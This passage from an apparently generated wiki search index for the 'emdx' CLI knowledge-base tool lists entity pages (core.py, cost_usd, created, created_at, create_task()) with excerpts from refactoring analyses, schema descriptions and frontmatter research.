Code Found","text":"<p><code>emdx/commands/core.py</code> \u2014 <code>DocumentMetadata.tags</code> field is never used and should be removed entirely: ```python</p>"},{"location":"entities/corepy/#before","title":"BEFORE","text":"<p>@dataclass class DocumentMetadata:     title: str     project: st...</p> <ul> <li> <p>#6363 Delegate: DEBT-15: Split the oversized emdx/database/migrations.py int [2/2]   Section: New Package Structure: <code>emdx/database/migrations/</code></p> <p>...frastructure: <code>run_migrations</code>, <code>get_schema_version</code>, <code>foreign_keys_disabled</code> | | <code>core.py</code> | 9.1k | Migrations 0-6: documents, FTS, tags, executions | | <code>workflow_tables.py</code> | 28k | Migrations 7-8, 11, 14, 16-17, 20-21, 23, 27: agent/workflow system | | `...</p> </li> <li> <p>#6330 Delegate synthesis [synthesis]   Section: Critical Issues (Address First)</p> <ol> <li>Monolithic files need decomposition:</li> </ol> </li> <li><code>migrations.py</code>: 2200 lines (39 migrations in one file)</li> <li><code>activity_view.py</code>: 1175 lines</li> <li><code>document_browser.py</code>: 1122 lines</li> <li><code>maintain.py</code>: 1098 lines</li> <li> <p><code>core.py</code>: 876 lines</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Layer Structure (Current)</p> <p>...\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 commands/         CLI entry points (Typer)                  \u2502 \u2502 \u251c\u2500\u2500 core.py       (876 lines) save, find, view, edit, delete\u2502 \u2502 \u251c\u2500\u2500 maintain.py   (1098 lines) maintenance operations       \u2502 \u2502 \u251c\u2500\u2500 delegate.py   (779 lines) AI execution orches...</p> </li> <li> <p>#6323 Delegate: Analyze emdx/commands/ for architecture improvements. Focus  [1/10]   Section: 1. Code Duplication</p> <p>...tern <code>db.ensure_schema()</code> appears at the start of nearly every command handler:</p> </li> <li><code>core.py</code>: lines 141, 364, 581, 654, 772-773</li> <li><code>tags.py</code>: lines 42, 153, 191, 237, 281, 334</li> <li><code>trash.py</code>: lines 56, 106, 165</li> <li><code>browse.py</code>: lines 30, 96, 145</li> <li> <p><code>groups.py</code>: l...</p> </li> <li> <p>#6319 Codebase Quality Analysis \u2014 Synthesized Summary (2026-02-14)   Section: Tier 1: Architecture Issues (High Impact)</p> <p>...t to <code>services/analysis_service.py</code> | | 7 commands bypass services layer | HIGH | <code>core.py</code>, <code>browse.py</code>, <code>gist.py</code>, <code>groups.py</code>, <code>tags.py</code>, <code>trash.py</code> import <code>database/</code> directly | | 2 layer violations | MEDIUM | <code>database/documents.py</code> imports from `mode...</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> </li> <li><code>core.py</code>: save, find, view, edit, delete</li> <li><code>browse.py</code>: list, recent, stats</li> <li><code>tags.py</code>: tag add/remove/list/rename/merge/batch</li> <li><code>trash.py</code>: trash, restore, purge</li> <li> <p>`tasks....</p> </li> <li> <p>#6279 Delegate: DEBT-8: Standardize CLI interfaces. Standardize doc_id param   Section: 1. Added Help Text to Typer Apps (9 files)</p> File Help Text Added <code>core.py</code> \"Core CRUD operations for documents\" <code>trash.py</code> \"Manage deleted documents (trash)\" <code>browse.py</code> \"Browse and list documents with statistics\" `gist.p... </li> <li> <p>#6264 Delegate: API/Interface Debt Fix - Help Text and Silent Failures   Section: 1. Added Help Text to 5 Typer Apps (Missing Documentation)</p> <p>...---|----------------| | <code>browse.py</code> | \"Browse and analyze the knowledge base\" | | <code>core.py</code> | \"Core document operations: save, find, view, edit, delete\" | | <code>executions.py</code> | \"Monitor and manage delegate executions\" | | <code>gist.py</code> | \"GitHub Gist integration...</p> </li> <li> <p>#6218 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]   Section: 2. Silent Success/Failure Scenarios</p> <p>...creation failure | Exception catch | Non-fatal exception silently passes (line 321 core.py) | | <code>group add</code> | Doc already in group | Silent \"already_in\" without exit code |</p> </li> <li> <p>#6179 Delegate: 10 [17/17]   Section: Key Components Added</p> </li> <li><code>emdx find --tags python,api</code> - Find docs with ALL specified tags</li> <li><code>emdx find --any-tags python,rust</code> - Find docs with ANY tags</li> <li> <p>Combined conten...</p> </li> <li> <p>#6162 Delegate: Audit test coverage. Check: (1) is there a test file for emd [8/17]   Section: (5) Which command modules have NO test file at all?</p> <p>...| | <code>cascade.py</code> | \u26a0\ufe0f PARTIAL (<code>test_cascade_metadata.py</code> tests DB, not CLI) | | <code>core.py</code> | \u2705 YES (<code>test_commands_core.py</code>) | | <code>delegate.py</code> | \u274c NO | | <code>executions.py</code> | \u26a0\ufe0f PARTIAL (<code>test_execution_system*.py</code> tests models, not CLI) | | <code>gdoc.py</code> | \u274c NO...</p> </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>...\u2713\\n     - <code>tags.py</code> \u2713\\n     - <code>export_profiles.py</code> \u2713\\n     - <code>gdoc.py</code> \u2713\\n     - <code>core.py</code> \u2713\\n     - <code>export.py</code> \u2713\\n     - <code>tasks.py</code> \u2713\\n     - <code>gist.py</code> \u2713\\n     - <code>lifecycle.py</code> \u2713\\n     - <code>workflows.py</code> \u2713\\n     - <code>claude_execute.py</code> \u2713\\n     - `maintain.p...</p> </li> <li> <p>#1835 Architecture Analysis: EMDX Control Center v5 Implementation   Section: Current Architecture Strengths</p> <p>...2. CLI Command Structure (Well-Organized) Modular pattern in <code>/emdx/commands/</code>:</p> </li> <li><code>core.py</code> (600+ lines) - save, find, view, edit, delete</li> <li><code>agents.py</code> (800+ lines) - agent management and execution</li> <li><code>executions.py</code> (500+ lines) - execution monitoring</li> <li> <p>`t...</p> </li> <li> <p>#295 EMDX Surface Area Reduction Plan</p> <p>Enhance <code>core.py:save()</code> to:</p> </li> <li>Accept optional positional argument for content/file</li> <li>Check stdin first (for pipe support)</li> <li>Auto-detect if argument is file path vs content</li> <li> <p>Generate smart titles when not provided</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: Key Findings</p> <p>...--|----------------|-----------|-------------|----------| | Commands (delegate.py, core.py) | 50+ | 45+ | 5 bugs | 90% | | Commands (other) | 46 | 46 | 0 | 100% | | Database | 45+ | 45+ | 0 | 100% | | Models | 38 | 38 | 0 | 100% | | Services (executors) |...</p> </li> <li> <p>#6456 Delegate: List the 3 most important Python files in the emdx/commands/   Section: 3 Most Important Python Files in emdx/commands/</p> <ol> <li>core.py \u2014 Implements the fundamental CRUD operations (save, find, view, edit, delete) for documents in the knowledge base.</li> </ol> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>...orktree isolation, PR creation, discovery mode. Well-designed, heavily used. | | core.py | 875 | ESSENTIAL - CRUD operations (save, view, edit, delete, find, list, recent). Bread and butter of the knowledge base. | | tasks.py | 389 | **VALUABLE...</p> </li> <li> <p>#6259 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [17/37]   Section: Changes Made</p> <p>...prime.py: Added module logger, cascade status errors logged at debug level</p> </li> <li>core.py: Added module logger, gist database recording errors logged as warnings</li> </ul>"},{"location":"entities/corepy/#2-command-layer-commands","title":"2. Command Layer (<code>commands/</code>)","text":"<p>Eager (fast, always loaded):</p>"},{"location":"entities/corepy/#4-enhanced-search-corepy-67-additions","title":"4. Enhanced Search (<code>core.py</code> - 67 additions)","text":""},{"location":"entities/corepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>source_path</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.0)</li> <li><code>gist.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=4.7)</li> <li><code>analyze.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=4.7)</li> <li><code>ask.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.7)</li> <li><code>maintain.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=4.6)</li> <li><code>browse.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=4.5)</li> <li><code>prime.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=4.4)</li> <li><code>status.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=4.4)</li> <li><code>trash.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=4.3)</li> <li><code>recipe.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.2)</li> </ul>"},{"location":"entities/costusd/","title":"cost_usd","text":"<p>Type: tech_term | Mentioned in: 16 documents | First seen: 2026-02-14</p>"},{"location":"entities/costusd/#documents-16","title":"Documents (16)","text":"<ul> <li> <p>#6713 wiki-schema-research   Section: Table 3: <code>wiki_articles</code> \u2014 Generated wiki content (self-hosted in <code>documents</code>)</p> <p>-- Cost tracking     input_tokens INTEGER DEFAULT 0,     output_tokens INTEGER DEFAULT 0,     cost_usd REAL DEFAULT 0.0,     generation_duration_ms INTEGER,  -- Wall-clock time</p> </li> <li> <p>#6708 Delegate: Analyze how running delegates are tracked in the database. R [3/4]   Section: The <code>executions</code> Table Schema (final form)</p> <p>...) | FK to cascade_runs | | <code>task_id</code> | INTEGER (nullable) | FK to tasks table | | <code>cost_usd</code> | REAL DEFAULT 0.0 | Total cost in USD | | <code>tokens_used</code> | INTEGER DEFAULT 0 | Total token count | | <code>input_tokens</code> | INTEGER DEFAULT 0 | Input tokens | | `output_t...</p> </li> <li> <p>#6605 Delegate: Fix PR #687: Add ExecutionResultDict TypedDict for Execution   Section: Changes Made</p> <p>...output_doc_id<code>,</code>output_content<code>,</code>tokens_used<code>,</code>input_tokens<code>,</code>output_tokens<code>,</code>cost_usd<code>,</code>execution_time_ms<code>,</code>error_message<code>,</code>exit_code<code>,</code>cli_tool`</p> </li> <li> <p>#6604 Delegate: Add ExecutionResultDict TypedDict for ExecutionResult.to_dic   Section: Changes</p> <p>...<code>(str | None),</code>tokens_used<code>(int),</code>input_tokens<code>(int),</code>output_tokens<code>(int),</code>cost_usd<code>(float),</code>execution_time_ms<code>(int),</code>error_message<code>(str | None),</code>exit_code<code>(int | None),</code>cli_tool` (str)</p> </li> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: 1. Created <code>emdx/ui/types.py</code></p> <p>...clude <code>id</code>, <code>name</code>, <code>description</code>, <code>group_type</code>, <code>created_at</code>, <code>doc_count</code>, <code>total_cost_usd</code>, <code>total_tokens</code>, <code>child_group_count</code>, <code>project</code>, <code>parent_group_id</code>, <code>is_active</code>.</p> </li> <li> <p>#6499 Any Type Removal Analysis [5/5]   Section: 1. <code>emdx/commands/delegate.py</code></p> </li> <li> <p>#6466 Fix: Execution Dataclass Schema-Model Mismatch in EMDX   Section: Missing Fields Identified</p> </li> <li><code>task_id</code> - Links executions back to the creating task</li> <li><code>cost_usd</code> - Tracks API costs in USD</li> <li><code>tokens_used</code> - Total token usage count</li> <li><code>input_tokens</code> - Input token count</li> <li> <p><code>output_tokens</code> - Output token count</p> </li> <li> <p>#6372 Codebase Bug Audit 2026-02-15 [4/10]   Section: Summary</p> <p>The <code>Execution</code> dataclass includes fields like <code>cost_usd</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code>, <code>cascade_run_id</code>, and <code>task_id</code>, but <code>get_execution()</code>, <code>get_recent_executions()</code>, <code>get_running_executions()</code>, and...</p> </li> <li> <p>#6277 Delegate: DEBT-2: Fix schema-model mismatch. The Execution dataclass i   Section: DEBT-2: Fix schema-model mismatch in Execution dataclass</p> <ol> <li>Migration 036 columns:</li> </ol> </li> <li><code>task_id</code> - Links execution to tasks</li> <li><code>cost_usd</code> - API cost tracking</li> <li><code>tokens_used</code> - Total token usage</li> <li><code>input_tokens</code> - Input token tracking</li> <li> <p><code>output_tokens</code> - Output token tracking</p> </li> <li> <p>#6268 Delegate: Document #6230 (Migration/Schema Debt Implementation)   Section: 1. Fixed Execution Dataclass (MEDIUM severity)</p> <p>...tion to cascade pipeline run</p> </li> <li><code>task_id</code>: Links execution back to creating task</li> <li><code>cost_usd</code>: Actual cost from Claude API</li> <li><code>tokens_used</code>: Total tokens consumed</li> <li><code>input_tokens</code>: Input tokens</li> <li> <p><code>output_tokens</code>: Output tokens</p> </li> <li> <p>#6249 Migration/Schema Debt Fix Implementation [6/14]   Section: Changes Made</p> <p>...mns to <code>Execution</code> dataclass:</p> </li> <li><code>cascade_run_id</code> (migration 031)</li> <li><code>task_id</code>, <code>cost_usd</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code> (migration 036)</li> <li><code>last_heartbeat</code> (migration 037)</li> <li> <p>Refactored all SELECT queries to use shared `_EXECUTION_COLUM...</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: Critical Findings (Immediate Action Required)</p> <p>...dataclass missing 6 columns from migrations 031/036: <code>cascade_run_id</code>, <code>task_id</code>, <code>cost_usd</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code></p> </li> <li> <p><code>last_heartbeat</code> column queries exist but column was dropped in migration 013</p> </li> <li> <p>#6228 Delegate: Audit MIGRATION/SCHEMA DEBT in the emdx project: Check datab [6/14]   Section: 1. MEDIUM: Execution Dataclass Out of Sync with Schema**</p> <p>...cade pipeline run | | <code>task_id</code> | 036 | Links execution back to creating task | | <code>cost_usd</code> | 036 | Actual cost from Claude API | | <code>tokens_used</code> | 036 | Total tokens consumed | | <code>input_tokens</code> | 036 | Input tokens | | <code>output_tokens</code> | 036 | Output token...</p> </li> </ul>"},{"location":"entities/costusd/#recommended","title":"Recommended","text":"<p>def _safe_update_execution(exec_id: int | None, **kwargs: str | int | float | None) -&gt; None: <code>`` **Why:**</code>update_execution<code>accepts</code>doc_id<code>(int),</code>cost_usd<code>(float),</code>tokens_used` (int), etc. A union covers the actual value types.</p>"},{"location":"entities/costusd/#from-migration-036","title":"From Migration 036","text":""},{"location":"entities/costusd/#related-entities","title":"Related Entities","text":"<ul> <li><code>tokens_used</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (15 shared docs, PMI=5.7)</li> <li><code>output_tokens</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (13 shared docs, PMI=5.7)</li> <li><code>input_tokens</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (13 shared docs, PMI=5.7)</li> <li><code>execution_time_ms</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.7)</li> <li><code>unified executor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.7)</li> <li><code>`emdx/services/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.7)</li> <li><code>.types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.7)</li> <li><code>execution.is_zombie</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>task_id: optional[int] = none</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>task redo</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> </ul>"},{"location":"entities/created/","title":"created","text":"<p>Type: tech_term | Mentioned in: 13 documents | First seen: 2025-07-07</p>"},{"location":"entities/created/#documents-13","title":"Documents (13)","text":"<ul> <li> <p>#6759 Wiki Generation Architecture: GitBook + Dendron Research [2/2]   Section: 1. Hierarchical Dot-Notation Naming</p> <p>...matter** \u2014 six required fields per note: <code>id</code> (UUID), <code>title</code>, <code>desc</code>, <code>updated</code>, <code>created</code>. Internal fields like <code>parent</code>, <code>children</code> (UUID arrays), <code>fname</code>, <code>links</code> are engine-tracked, not serialized to disk. Title auto-generates from basename: `my-cool-...</p> </li> <li> <p>#6756 Dendron VS Code Extension Deep Dive [synthesis]   Section: Core Architecture</p> </li> <li> <p>#6747 dendron-deep-dive   Section: How Should Intermediate Nodes Get Auto-Created with Useful Content?</p> <ol> <li>Auto-generate summary stubs: When <code>recipes.italian.desserts.tiramisu</code> is created, auto-generate <code>recipes.italian.desserts</code> with:</li> </ol> </li> <li>A list of all children (auto-maintained)</li> <li>A 1-2 sentence summary synthesized from children's content</li> <li> <p>Cr...</p> </li> <li> <p>#6733 Dendron VS Code Extension Deep Dive [1/5]   Section: 3. Note Frontmatter Structure</p> <p>```yaml</p> </li> </ul> <p>id: 4RFQMNA91cRW12VJl_PFd title: Taking Notes desc: Creating notes and understanding hierarchy updated: 1639425310320 created: 1625563944736</p> <pre><code>\n- **#6596** Delegate: Research import paths \u2014 how should emdx import from Obsidian [3/4]\n  *Section: Frontmatter Mapping*\n  &gt; ```yaml\n---\ntitle: \"Meeting Notes\"\ntags: [work, meeting]\naliases: [\"standup\", \"daily\"]\ncreated: 2024-01-15\n---\n</code></pre> <ul> <li>#6464 Claude Document Templates Comprehensive Guide   Section: Claude Document Templates Comprehensive Guide </li> <li>Type: #GUIDE</li> <li>Status: #COMPLETE</li> <li> <p>Created: 2026-02-15</p> </li> <li> <p>#6363 Delegate: DEBT-15: Split the oversized emdx/database/migrations.py int [2/2]   Section: Files Changed</p> <ul> <li>Deleted: <code>emdx/database/migrations.py</code> (monolithic 2200+ line file)</li> </ul> </li> <li> <p>Created: <code>emdx/database/migrations/</code> package with 9 modules</p> </li> <li> <p>#26 FZF Interactive Claude List v1 Plan   Section: FZF Interactive Claude List (cla) - Minimal v1 Plan</p> </li> <li>Type: #PLAN</li> <li>Status: #PLANNED</li> <li>Priority: #HIGH</li> <li> <p>Created: 2025-01-05</p> </li> <li> <p>#31 Claude-List Improvement Plan v2   Section: Claude-List Improvement Plan</p> </li> <li>Type: #PLAN</li> <li>Status: #PLANNED</li> <li>Priority: #MEDIUM</li> <li>Created: 2025-01-05</li> <li> <p>Related: #2089</p> </li> <li> <p>#32 Claude Document Templates Quick Reference   Section: For Plans</p> </li> <li>Type: #PLAN</li> <li>Status: #PLANNED</li> <li>Priority: #HIGH | #MEDIUM | #LOW</li> <li> <p>Created: YYYY-MM-DD</p> </li> <li> <p>#36 Claude Document Template System   Section: Standard Document Format</p> <p>...ENTED | #PARTIAL | #OBSOLETE | #BLOCKED</p> </li> <li>Priority: #HIGH | #MEDIUM | #LOW</li> <li>Created: YYYY-MM-DD</li> <li>Updated: YYYY-MM-DD</li> <li>Related: #ID1, #ID2 (reference other docs)</li> </ul>"},{"location":"entities/created/#frontmatter","title":"Frontmatter","text":"<p>Six required fields: <code>id</code> (UUID), <code>title</code>, <code>desc</code>, <code>updated</code>, <code>created</code> \u2014 plus optional <code>config</code>, <code>tags</code>, <code>template</code>, <code>nav_order</code>, etc. Internal fields (<code>fname</code>, <code>parent</code>, <code>children</code>, <code>body</code>, <code>links</code>) are engine-tracked, not serialized.</p>"},{"location":"entities/created/#metadata","title":"Metadata","text":""},{"location":"entities/created/#metadata_1","title":"Metadata","text":""},{"location":"entities/created/#metadata_2","title":"Metadata","text":""},{"location":"entities/created/#metadata_3","title":"Metadata","text":""},{"location":"entities/created/#related-entities","title":"Related Entities","text":"<ul> <li><code>related</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.0)</li> <li><code>how to test</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.0)</li> <li><code>vault/lang.python.basics.md</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>root.md</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>reproduction</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>lang.python.basics</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>lang.python</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>dendron pattern</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>[title] plan</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>wikilink handling options</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> </ul>"},{"location":"entities/createdat/","title":"created_at","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-01-14</p>"},{"location":"entities/createdat/#documents-11","title":"Documents (11)","text":"<ul> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: 1. Created <code>emdx/ui/types.py</code></p> <p>...<code>in the activity view. Fields include</code>id<code>,</code>name<code>,</code>description<code>,</code>group_type<code>,</code>created_at<code>,</code>doc_count<code>,</code>total_cost_usd<code>,</code>total_tokens<code>,</code>child_group_count<code>,</code>project<code>,</code>parent_group_id<code>,</code>is_active`.</p> </li> <li> <p>#6505 None Type Analysis [3/7]   Section: Schema-Aligned Nullable Fields (All NECESSARY)</p> <p>...| | CascadeMetadata | pr_url | pr_url | <code>TEXT</code> (no NOT NULL) | | CascadeMetadata | created_at/updated_at | timestamps | <code>DEFAULT CURRENT_TIMESTAMP</code> but could be NULL in edge cases | | CascadeDocumentListItem | project | project | <code>TEXT</code> (no NOT NULL) | | Casc...</p> </li> <li> <p>#6497 None Type Analysis [6/7]   Section: Final Assessment: 0 Unnecessary <code>| None</code> Annotations</p> <p>...Start as <code>None</code>, populated on demand</p> </li> <li>Database nullable fields \u2014 <code>project</code>, <code>created_at</code>, etc. can be <code>NULL</code></li> <li>Optional return values \u2014 Functions that may return <code>None</code> on no-match</li> <li> <p>Optional callbacks \u2014 Progress callbacks that are <code>None</code> when...</p> </li> <li> <p>#6498 None Type Analysis [4/7]   Section: 1. <code>emdx/models/types.py</code> (TypedDict definitions)</p> <p>...None<code>| Optional | |</code>TaskDict.current_step: str | None<code>| Optional | |</code>TaskDict.created_at: str | None<code>| Technically always set, but safe | |</code>TaskDict.updated_at: str | None<code>| Can be NULL before first update | |</code>TaskDict.completed_at: str | None` |...</p> </li> <li> <p>#6484 Any Type Removal Analysis [4/5]   Section: File: <code>emdx/services/unified_search.py</code></p> <p>Or more explicitly with TypedDict: ```python class FuzzyDoc(TypedDict):     id: int     title: str     project: str | None     created_at: str | None     updated_at: str | None</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Tasks Table (Core Entity)</p> <p>...<code>current_step</code> | TEXT | NULL | Current step for resumption | | Timestamps | | <code>created_at</code> | TIMESTAMP | now | Creation time | | <code>updated_at</code> | TIMESTAMP | now | Last update time | | <code>completed_at</code> | TIMESTAMP | NULL | Completion time (auto-set on done) |...</p> </li> <li> <p>#6410 Delegate: Research and design structured metadata for emdx save and de [2/2]   Section: Current State Analysis</p> <p>Existing document fields:</p> </li> <li><code>id</code>, <code>title</code>, <code>content</code>, <code>project</code> (core data)</li> <li><code>created_at</code>, <code>updated_at</code>, <code>accessed_at</code>, <code>access_count</code> (timestamps/tracking)</li> <li><code>is_deleted</code>, <code>deleted_at</code> (soft delete)</li> <li> <p><code>parent_id</code>, <code>relationship</code> (document hierarchy - su...</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Database Schema</p> <p>...o documents table</p> </li> <li><code>project</code>: Project name</li> <li><code>current_step</code>: Resume checkpoint</li> <li> <p><code>created_at</code>, <code>updated_at</code>, <code>completed_at</code>: Timestamps</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Task Fields</p> <p>...oject name filter | | <code>current_step</code> | TEXT | NULL | Current step within task | | <code>created_at</code> | TIMESTAMP | now | Creation time | | <code>updated_at</code> | TIMESTAMP | now | Last update time | | <code>completed_at</code> | TIMESTAMP | NULL | Completion time (set when status=don...</p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Overlap Between Delegate's Task Tracking and Task System</p> <p>...| <code>open/active/blocked/done/failed</code> | <code>running/completed/failed</code> | | Start time | <code>created_at</code> | <code>started_at</code> | | End time | <code>completed_at</code> | <code>completed_at</code> | | Output | <code>output_doc_id</code> | N/A (just tracks completion) | | Error | <code>error</code> column | <code>exit_code</code> |</p> </li> <li> <p>#4848 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Tier 2: Important (Strongly Recommended)</p> <ol> <li>Add <code>created_at</code> timestamps on all bridge tables for debugging/auditing</li> </ol> </li> <li>Use CHECK constraints for discriminator columns in polymorphic patterns</li> <li>**Handle IntegrityError g...</li> </ul>"},{"location":"entities/createdat/#related-entities","title":"Related Entities","text":"<ul> <li><code>cycle detection</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.3)</li> <li><code>task_deps table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>update_task(id, **kwargs)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>task_log table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>task types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>task granularity</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>status flow</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>execution_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>dependency system</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>chain tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> </ul>"},{"location":"entities/createtask/","title":"create_task()","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-13</p>"},{"location":"entities/createtask/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: emdx/commands/delegate.py</p> <p>Why: This is a thin wrapper around <code>create_task()</code>. Either use <code>Unpack[CreateTaskKwargs]</code> (Python 3.12+) or explicitly type the parameters passed. The latter is cleaner and provides better IDE support.</p> </li> <li> <p>#6499 Any Type Removal Analysis [5/5]   Section: 1. <code>emdx/commands/delegate.py</code></p> <p>...None = None, ) 